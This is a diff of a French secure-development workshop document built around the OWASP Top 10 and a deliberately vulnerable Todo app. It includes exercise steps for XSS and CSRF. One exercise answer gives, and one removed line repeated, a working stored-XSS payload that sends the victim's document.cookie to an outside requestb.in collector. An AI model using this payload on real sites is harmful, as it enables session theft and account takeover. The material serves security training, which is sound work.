@@ -1,7 +1,6 @@
 = Pas à pas
 :author: Pascal Abaziou
 :email: https://github.com/javathought[@javathought]
-//pascal.abaziou@gmail.com
 :revnumber: v1.0
 :revdate: 27.02.2018
 :revremark: First draft
@@ -23,44 +22,21 @@
 ++++
 
 :stylesheet: stylesheets/fontawesome-4.1.0.css
-//:iconfont-cdn: //maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css
-// First unset attribute to remotely link FontAwesome CSS
 :iconfont-remote!:
 
-// Specify name of FontAwesome CSS.
 :iconfont-name: fontawesome-4.1.0
 :stylesdir: stylesheets
-//:stylesdir: ./stylesheets
 :numbered:
 
  Préambule
 
-icon:bus[]
 
 = Introduction
 
-== Pourquoi le développement sécurisé ?
-
-image::info_nov.png[Page d'accueil après passage au journal télé en novembre 2017]
-
-Prendre en compte les exigences de sécurité tout au long du cycle de vie de l'application : conception, développement, test, ...
-
-Coûts de la sécurité à comparer avec les risques encourus
-
-Normes règlementaires
- GDPR, CNIL
- PCI-DSS
-
-Analyse de risque :
-
-. Disponibilité
-. Intégrité
-. Confidentialité
-. Preuve
-
 === OWASP
 
-https://www.owasp.org/index.php/Main_Page
+Le site de l'OWASP : https://www.owasp.org/index.php/Main_Page
+
 https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project#tab=Main[Top 10]
 
 Le document Top 10 propose une grille d'évaluation du risque pour chacun des items.
@@ -314,7 +290,7 @@ Créez un todo de type publique avec un script d'attaque
 
 [id=reponse9,role=collapse]
 --
-utilisez le code suivant dans la description de la todo.
+utilisez le code suivant dans la description de la todo (en remplaçant l'id 1lwyhpu1 par celui que vous avez généré).
 <script>document.write("<img src=https://requestb.in/1lwyhpu1?s="+encodeURI(document.cookie)+"></img>");</script>
 --
 
@@ -439,9 +415,6 @@ Supprimez vos droits administrateurs puis essayez d'accéder et/ou modifier les 
 
 == Security Misconfiguration
 
-== Obtenez les informations de session de l'administrateur
-
-XSS + passer en cookie
 
 == Insecure deserialization
 
@@ -530,6 +503,16 @@ Ajoutez l'IP d'origine, elle pourra permettre les actions suivantes:
 . bannir une ip
 
 
+== créez un todo dans la liste de l'utilisateur connecté
+
+Utilisez le site de hacker sous le répertoire `owasp-hacker` pour faire une action à l'insu de l'utilisateur connecté :
+
+- démarrez le site de hacker `npm run lite`
+- allez à l'adresse : https://localhost:9095/#/nice
+- cliquez sur le bouton  `cliquez ici`
+- retourner sur le site de Todo et regardez votre liste de Todos
+
+Ajoutez une protection contre les attaques CSRF :
 
 
 == click jacking  et headers
@@ -538,21 +521,17 @@ Ajoutez l'IP d'origine, elle pourra permettre les actions suivantes:
 
 == ajouter des tests
 
+Le module `owasp-jersey` contient une structure de tests utilisant `Cucumber` et `rest-assured. Enrichissez-là
+pour faire un rapport de tests de sécurité.
 
-== Agmentez encore vos privilèges
+Les tags de cucumber permettent de présenter la couverture des risques owasp
+
+image::couverture_test.png[couverture owasp]
+
+
 
 == 2FA
 
 == Reinit password
 
 
-[NOTE]
-====
-Docker for Mac :
-
-sudo ifconfig lo0 alias 10.0.0.2
-====
-
-
-
-<script>document.write("<img src=https://requestb.in/1lfbtmw1?s="+encodeURI(document.cookie)+"></img>");</script>
